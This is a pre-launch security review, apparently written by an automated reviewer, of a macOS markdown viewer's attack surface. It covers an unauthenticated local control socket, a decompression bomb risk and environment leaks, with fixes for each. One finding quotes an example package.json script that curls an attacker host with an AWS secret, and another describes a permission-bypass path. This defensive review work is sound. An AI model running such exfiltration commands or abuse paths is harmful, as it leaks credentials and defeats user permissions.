# Pre-Launch Product Review — Attack Surface Enumeration (v2)

**Dimension:** Attack surface enumeration — every untrusted-input surface, what
reaches it, and what happens.
**Repo:** `/Users/me/Documents/workspaces/claude/markdown_viewer`
**Date:** 2026-07-10
**Reviewer:** automated dimension review (static analysis; no code modified)
**Note:** an earlier `attack-surface.md` exists from a prior run; this v2 is an
independent fresh pass (per the "re-run research fresh" directive) and does not
overwrite it.

---

## Executive summary

The codebase is, on the whole, **unusually well-hardened for its class**. Nearly
every input surface I examined has an explicit, commented threat model and a
matching test: the custom URL scheme funnels through a symlink-resolving home/temp
containment fence (`URLSchemePolicy`), the git client strips `GIT_*` from the
environment and disables config-driven RCE vectors (`core.hooksPath=/dev/null`
etc.), the LSP binary locator refuses group/world-writable install dirs up the
whole ancestor chain, the plugin subprocess host scrubs the environment to `HOME`
only and contains the executable inside its folder after symlink resolution, the
archive browser streams entries over stdout so entry names never become
filesystem paths (zip-slip closed), and the Rust FFI boundary null-checks every
pointer and catches panics before they abort the host.

The one surface that stands out as **under-defended relative to the rest** is the
**always-on, unauthenticated MCP control socket** (TSK-1544). Every app launch
opens a Unix-domain socket that exposes the full automation tool catalog —
file open/read, workspace command execution (`run_task`), file move/rename — to
*any* process running as the same user, with no opt-in, no peer-credential check,
no token, and no user-visible indication it is live. Because the app is **not
sandboxed** and carries TCC grants for Documents/Desktop/Downloads/removable/
network volumes, this socket is a **confused-deputy**: a same-user process that
was never granted those TCC permissions can borrow the app's access through the
socket. That is the single finding I would treat as a ship-gating discussion item
(P1).

The remaining findings are P2/P3 hardening: a decompression-bomb OOM in the
archive reader (cap checked *after* the whole payload is buffered), full
parent-environment inheritance in `run_task`, LSP auto-launch on untrusted
workspaces with no trust prompt, and an `unzip` glob-metacharacter nuance.

**Findings:** 1 × P1, 3 × P2, 2 × P3.

---

## Methodology

**What I examined (read in full or substantially):**

- **URL scheme / Launch Services entry:** `Sources/MarkdownViewer/main.swift`
  (`application(_:open:)`, `handleCustomURLScheme`, listener bootstrap),
  `Sources/ViewerCore/URLSchemeRouter.swift`,
  `Sources/ViewerCore/Security/URLSchemePolicy.swift`, `scripts/Info.plist`
  (`CFBundleURLTypes`, `CFBundleDocumentTypes`, `NSServices`, TCC usage strings).
- **MCP / automation control plane:**
  `Sources/ViewerCore/Automation/MCPSocketListener.swift`,
  `MCPSocketBridge.swift`, `MCPToolCatalog.swift` (open_path / run_task /
  move_file / rename_symbol / run_verb / find, plus the `validatedExistingURL`
  fence).
- **Subprocess surfaces:** `Sources/ViewerCore/Archive/ArchiveCatalog.swift`,
  `Sources/ViewerCore/Plugins/PluginSubprocessHost.swift`,
  `Sources/ViewerCore/Plugins/PluginRegistry.swift`, `PluginManifest.swift`
  (capability gate), `Sources/ViewerCore/LSP/LSPDiscovery.swift`,
  `Sources/ViewerCore/Git/GitClient.swift` (env allowlist + protective flags).
- **Terminal:** `Sources/ViewerCore/Terminal/ANSIParser.swift`,
  `TerminalOSC7.swift` (OSC handling — checked for OSC 52 clipboard / OSC 8
  injection vectors).
- **FFI / untrusted-bytes boundary:** `rust-core/crates/ffi/src/guard.rs`,
  `buf.rs`, `lib.rs` (pointer/length validation, panic boundary).
- **Image / clipboard:** `Sources/ViewerCore/ImageEditing/ImageDocument.swift`
  (decode path), clipboard read sites.

**How much:** ~12 core files read end-to-end plus grep-driven sweeps across
`Sources/` and `rust-core/` for `Process()`, `from_raw_parts`, OSC/clipboard,
env inheritance, and containment helpers. Static analysis only — no tests run, no
window opened, per task constraints.

---

## Findings

### P1-1 — MCP control socket is always-on, unauthenticated, and a TCC confused-deputy

- **Severity:** P1
- **Files:** `Sources/MarkdownViewer/main.swift:225` (unconditional
  `startMCPSocketListener()`), `main.swift:4144-4153`,
  `Sources/ViewerCore/Automation/MCPSocketListener.swift:16-23` (stated security
  model), `MCPSocketBridge.swift:100-102` (server is stateless — tools not gated
  on `initialize`), `Sources/ViewerCore/Automation/MCPToolCatalog.swift`
  (tool catalog: `open_path`, `run_task`, `move_file`, `rename_symbol`).
- **Evidence:** `applicationDidFinishLaunching` calls
  `startMCPSocketListener()` unconditionally on every launch (no `#if DEBUG`,
  no preference gate — confirmed reading `main.swift:214-238`). The listener
  binds `~/Library/Application Support/MarkdownViewer/mcp.sock`, `chmod 0600`,
  and each accepted connection gets a full `MCPServer` over the *same* tool
  catalog as the stdio server. The bridge comment is explicit that the server is
  **stateless** — "tools/list & tools/call are not gated on `initialize`"
  (`MCPSocketBridge.swift:100-102`) — so there is no handshake, no token, and no
  authentication of any kind. The documented model is literally "same-user only…
  no auth token in v1" (`MCPSocketListener.swift:15-16`). There is no
  `LOCAL_PEERCRED` / `getpeereid` check on the accepted fd (`acceptLoop`/`serve`,
  lines 125-171, pass `nil` for the peer address and never inspect the peer).
- **Impact:** The socket path is stable and predictable. Any process running as
  the same user can connect and drive the app. On its face "same user = trusted"
  is the macOS norm — but two things make this materially worse than a plain
  local socket:
  1. **TCC confused-deputy / privilege escalation.** The app is **not
     sandboxed** and its `Info.plist` carries TCC usage descriptions for
     Documents, Desktop, Downloads, removable, and network volumes
     (`scripts/Info.plist`). Once the user approves those, the *app* holds
     file-access grants that an arbitrary same-user helper (a browser
     subprocess, a downloaded script, a sandboxed peer app) does **not**. Via
     `open_path` + a content read (`visible_text` / `current_state`), such a
     process reads TCC-protected files *through* the app's grant — a
     confused-deputy TCC bypass, not merely "do what you could already do."
  2. **Command execution + file mutation.** `run_task` executes
     workspace-derived commands; `move_file` / `rename_symbol` mutate the
     filesystem. These are reachable over the same unauthenticated socket.
  There is no user-visible indication the control plane is live, and no way to
  turn it off short of not running the app.
- **Suggested fix:** (a) Gate the listener behind an explicit, default-**off**
  preference ("Allow this app to be controlled by local agents") with a visible
  menu-bar/status indicator when active. (b) Add a `LOCAL_PEERCRED`/`getpeereid`
  check and/or a per-session token the connecting bridge must present (write the
  token to the same 0600 dir; the CLI reads it). (c) At minimum, split the
  read-only tools from the mutating/exec tools and require an explicit grant for
  the latter over the socket.
- **Fix size:** M (preference + peer-cred gate) to L (token handshake + tool
  tiering).
- **Fix risk:** careful — changing the always-on default could break the
  documented `--mcp-connect` bridge workflow; needs the CLI updated in lockstep.

---

### P2-1 — Archive reader buffers the entire decompressed entry before the size cap (decompression-bomb OOM)

- **Severity:** P2
- **Files:** `Sources/ViewerCore/Archive/ArchiveCatalog.swift:208` (the read),
  `:111-113` and `:133-136` (the cap check — *after* the read),
  `:196-225` (`run`).
- **Evidence:** `run()` drains the subprocess with
  `stdout.fileHandleForReading.readDataToEndOfFile()` (line 208) into an
  unbounded `Data`. The `maxEntryBytes` (64 MiB) guard is only applied *after*
  the full read returns: `zipEntryBytes` checks `data.count <= maxEntryBytes` at
  line 111, `extractEntry` at line 133. For `extractEntry`/`zipEntryBytes` the
  tool is `unzip -p` / `tar -xO`, which **streams the decompressed member** to
  stdout. A single archive member that decompresses to multiple GB is therefore
  read entirely into memory before the cap can reject it. The 20s wall-clock
  timeout bounds *duration* but not *bytes* — `unzip -p` can emit many GB in 20s.
- **Impact:** Opening an archive and peeking/extracting a bomb entry (a classic
  42.zip-style nested or single-stream bomb) drives the app's memory footprint
  toward OOM → the app (and possibly the session) is killed. User must open a
  malicious archive and trigger extraction, so it is not zero-click, but archive
  browsing is a headline feature and the file is fully attacker-controlled.
- **Suggested fix:** Cap during the read: read in fixed chunks and abort (kill
  the process, return `entryTooLarge`) once accumulated bytes exceed
  `maxEntryBytes`, instead of `readDataToEndOfFile()`. The `ProcessRunner`
  already implements exactly this bounded-read pattern (`maxOutputBytes`) — reuse
  it here.
- **Fix size:** S
- **Fix risk:** safe — bounded read is strictly stricter than the current
  behavior; existing tests pin the small-entry path.

---

### P2-2 — `run_task` inherits the app's full parent environment

- **Severity:** P2
- **Files:** `Sources/ViewerCore/Automation/MCPToolCatalog.swift:475-478`.
- **Evidence:** When a discovered task carries its own environment, `run_task`
  builds the child env as
  `ProcessInfo.processInfo.environment.merging(spec.environment)` — i.e. the
  **entire** parent environment plus the task's overrides. Contrast the git
  client (`GitClient.swift:1318-1344`) and plugin host
  (`PluginSubprocessHost.swift:456-462`), which both deliberately build a minimal
  allowlisted env precisely to avoid leaking `*_TOKEN`/`*_SECRET`/`AWS_*` into
  spawned processes. `run_task` is reachable over the unauthenticated socket
  (see P1-1) and runs a **workspace-derived** command (from `package.json`
  scripts / Makefile targets / etc. via `RunnableTaskDiscovery`).
- **Impact:** If the app was launched from a shell (or by a launch agent) that
  had secrets in its environment, a workspace-defined task — e.g. a malicious
  repo's `"scripts": { "build": "curl attacker/$AWS_SECRET_ACCESS_KEY" }` —
  exfiltrates them when the agent (or any socket client) runs the task. For a
  Finder-launched GUI app the parent env is usually minimal, which is why this is
  P2 rather than P1, but the leak is real and inconsistent with the codebase's
  own env-hygiene standard elsewhere.
- **Suggested fix:** Build the `run_task` child environment from a minimal
  allowlist (`HOME`, `PATH`, `LANG`, `TMPDIR`, and the task's declared overrides)
  the same way `GitClient`/`PluginSubprocessHost` do; do not copy `*_TOKEN` /
  `*_SECRET` / `*_KEY` / `AWS_*` / `GIT_*`.
- **Fix size:** S
- **Fix risk:** safe — could break a task that relied on an inherited var, but
  that reliance is itself the bug; allowlist can be widened deliberately.

---

### P2-3 — LSP servers auto-launch on the workspace with no trust prompt (inherent-editor risk, undocumented)

- **Severity:** P2
- **Files:** `Sources/ViewerCore/LSP/LSPDiscovery.swift:240-289`
  (`tsWorkspaceRoot`, `pythonWorkspaceRoot`, `javaWorkspaceRoot`),
  `Sources/ViewerCore/LSP/LSPClient.swift` (long-running daemon, not CPU-capped —
  see `LSPDiscovery.swift:373-386` note).
- **Evidence:** Opening a source file walks up to a workspace root (by
  `tsconfig.json` / `package.json` / `pyproject.toml` / `pom.xml` markers) and
  launches the matching language server rooted there. The **binary** discovery is
  well-hardened (ownership checks up the ancestor chain, `isBinarySafeToSpawn`),
  so the app won't run a workspace-local *server binary*. **However**, the server
  is pointed at an attacker-controlled workspace, and several language servers
  execute project-supplied code by design — e.g. TypeScript's `tsserver` loads
  `compilerOptions.plugins` from a workspace `tsconfig.json` (workspace
  `node_modules`), and various servers run project config. The app does not
  prompt "trust this workspace?" before starting LSP (unlike VS Code's Workspace
  Trust).
- **Impact:** Opening a malicious repo can lead the *language server* to execute
  workspace code — the standard "opening a folder in an editor is code execution"
  risk. It is not introduced by this app (it is the server's behavior), but it is
  a real surface and there is no trust gate or documentation of the exposure.
  Runtime caps also don't apply to the LSP daemon (only to `--version` probes),
  so a wedged/hostile server can peg CPU indefinitely.
- **Suggested fix:** Add an opt-in "enable language servers for this workspace"
  trust prompt (persisted per root), defaulting off for newly-seen roots; and/or
  document the exposure in security notes. Consider a generous CPU/RSS cap on the
  LSP daemon with a "server is using excessive CPU — stop?" affordance.
- **Fix size:** M
- **Fix risk:** careful — a trust prompt changes the first-open UX for every
  project; needs product sign-off.

---

### P3-1 — `unzip` entry name is treated as a glob pattern

- **Severity:** P3
- **Files:** `Sources/ViewerCore/Archive/ArchiveCatalog.swift:109`
  (`unzip -p -- url.path name`), `:129`.
- **Evidence:** After `--`, `unzip` still interprets the trailing file
  argument(s) as **shell-style match patterns**, not literal names (`*`, `?`,
  `[...]` are wildcards). For `extractEntry`, `name` is a user-selected entry
  drawn from the listing — so a crafted archive whose entry names contain glob
  metacharacters can cause `unzip -p` to match a *different* member (or several,
  concatenated) than the one the UI thinks it is extracting. The `--` guards
  against option injection (leading `-`), not glob expansion.
- **Impact:** Low. Output still streams to stdout under the byte cap; worst case
  is that the extracted/previewed bytes are a different member than the row the
  user clicked (a confusing UX / minor content-confusion), not code execution or
  path escape. `tar` (line 131) takes literal names so it is unaffected.
- **Suggested fix:** Escape `unzip` glob metacharacters in `name` (`*?[` → `[*]`
  etc.) before passing, post-verify that exactly one member matched, or match the
  listed entry by exact index rather than by name.
- **Fix size:** S
- **Fix risk:** safe.

---

### P3-2 — Plugin `bin` has no integrity/writability check after grant (defense-in-depth parity gap with LSP)

- **Severity:** P3
- **Files:** `Sources/ViewerCore/Plugins/PluginRegistry.swift:229-256`
  (`defaultPluginsDir` scan), `PluginSubprocessHost.swift:135-178` (containment
  check), `PluginManifest.swift:52-126` (capability gate).
- **Evidence:** Third-party plugins load from a fixed app-support dir and are
  gated by a capability grant store (Tier B subprocess execution requires the
  `shell.exec` capability, which forces the grant prompt — verified: the "manifest
  declares zero capabilities" short-circuit at `PluginRegistry.swift:296` cannot
  smuggle a Tier B exec through, because `requiredCapabilities.isSubset` at
  `:366` rejects a Tier B provider whose manifest omits `shell.exec`). This is a
  **good** design. The residual gap: the plugin host checks symlink-containment
  of `bin` inside its folder but does **not** apply the LSP path's
  `isBinarySafeToSpawn` group/world-writability refusal to plugin `bin`s, and
  does not hash the granted binary. A same-user in-place swap of the executable
  after grant is re-run silently on the next sidebar refresh.
- **Impact:** Low and requires same-user write access to the plugin folder (which
  already implies a foothold). Noted for defense-in-depth parity with the LSP
  path.
- **Suggested fix:** Apply `isBinarySafeToSpawn` to plugin `bin`s and consider
  hashing the granted `bin` so a post-grant swap re-triggers the consent prompt.
- **Fix size:** S
- **Fix risk:** safe.

---

## Positive observations

Surfaces I probed for the obvious vulnerability class and found **correctly
defended** — recorded so the review does not read as uniformly negative:

- **Custom URL scheme containment** (`URLSchemePolicy.containedPath`): resolves
  symlinks on *both* the candidate and the home/temp jail roots before the prefix
  comparison (closes the `~/link -> /etc` escape), uses anchored
  `== temp || hasPrefix(temp + "/")` (closes the `T-attacker` sibling-prefix
  escape), rejects relative paths, and is deliberately existence-agnostic to
  avoid a file-existence oracle. The `walkthrough` route additionally requires an
  interactive confirmation before driving UI automation
  (`main.swift:680-693`).
- **Git RCE hardening** (`GitClient.swift:1257-1344`): per-invocation
  `-c core.hooksPath=/dev/null`, `core.fsmonitor=false`, `core.editor=true`,
  `core.pager=cat`; env built from a minimal allowlist that strips all `GIT_*`
  control vars, sets `GIT_TERMINAL_PROMPT=0`. Closes the hostile-`.git/config`
  and credential-helper vectors.
- **LSP binary discovery** (`LSPDiscovery.isBinarySafeToSpawn`): refuses to spawn
  a server whose binary *or any ancestor directory* is group/world-writable
  (closes both swap-in-place and rename-swap), canonicalizes first.
- **Plugin subprocess isolation** (`PluginSubprocessHost`): env scrubbed to
  `HOME` only, executable contained within the plugin folder after symlink
  resolution, own process group so a timeout `killpg`s the whole tree, 5s / 1MB
  hard caps, `F_SETNOSIGPIPE` to prevent a host-killing SIGPIPE, audit log at
  0600, leak-free stable error descriptors.
- **Archive zip-slip** (`ArchiveCatalog`): entry names never drive filesystem
  paths — extraction streams over stdout into an app-chosen UUID temp dir;
  `sanitizedLeaf` is display-only defense-in-depth. `--` separators guard option
  injection.
- **Rust FFI boundary** (`ffi_frame_body!` in `guard.rs`): null-checks `out_buf`
  and `req`, handles `req_len == 0` without dereferencing, wraps every entry in
  `catch_unwind` to convert a panic into `MdvStatus::Panic` (host survival), and
  the workspace forbids `unsafe_code` outside this one crate.
- **Terminal escape handling** (`ANSIParser`): OSC payload is length-bounded
  (`oscMaxLen = 4096`) and **only OSC 7 (cwd) is acted on** — every other OSC
  (including the dangerous **OSC 52 clipboard-write** and OSC 8 hyperlink) is
  swallowed inert, so terminal output cannot inject into the system pasteboard.
- **Image decoding** (`ImageDocument`): decodes via system frameworks
  (`.url`/`.data` source → ImageIO/NSImage) rather than a hand-rolled parser, so
  memory-safety of image parsing is Apple's patched surface, not bespoke app code.
- **MCP path fence** (`validatedExistingURL`): same symlink-resolving,
  anchored-prefix home/temp containment as the URL scheme, with containment
  checked *before* existence to avoid an existence oracle.

---

## Coverage gaps (not examined, or examined only shallowly)

- **SQLite / `pm` crate (rusqlite):** did not audit the project-management store's
  query construction for SQL injection or the untrusted-input path into it.
- **Rust core parsers (markdown / csv / hex / json / formula / canvas DSL):**
  verified the *FFI boundary* is safe but did not fuzz or read the individual
  engine parsers for panics/OOM on adversarial input. The repo has `proptest` and
  `cargo-fuzz` lanes (per `CLAUDE.md`) — did not confirm each parser has a target.
- **PTY / terminal process spawn** (`Sources/ViewerUI/Terminal/PTYProcess.swift`,
  `TerminalModel.swift`, tmux control-mode parsers `TmuxControlParser`,
  `TmuxLayoutParser`): read the pure ANSI/OSC parser but not the PTY spawn / env
  inheritance / tmux control-protocol parsing (semi-trusted structured input).
- **Clipboard *read* paths:** located the read sites (`DocumentModel`,
  `CSVTableView`, `MetadataPanel`, `TextToolRunner`, `TerminalNSView`) but did not
  trace whether pasted HTML/RTF or file URLs are sanitized before use.
- **Canvas DSL / `canvas_*` MCP tools:** did not review the DSL parser or the KIT
  import path for adversarial-input handling.
- **Session / bookmark / history deserialization:** the persisted-state JSON under
  Application Support is loaded at launch; did not check decoders for
  malformed-input robustness.
- **Network surfaces:** confirmed no TCP listener on the MCP path; did not
  enumerate outbound network use, nor the `mdv-serve` daemon / `RemoteCoreAttach`
  remote-core transport.
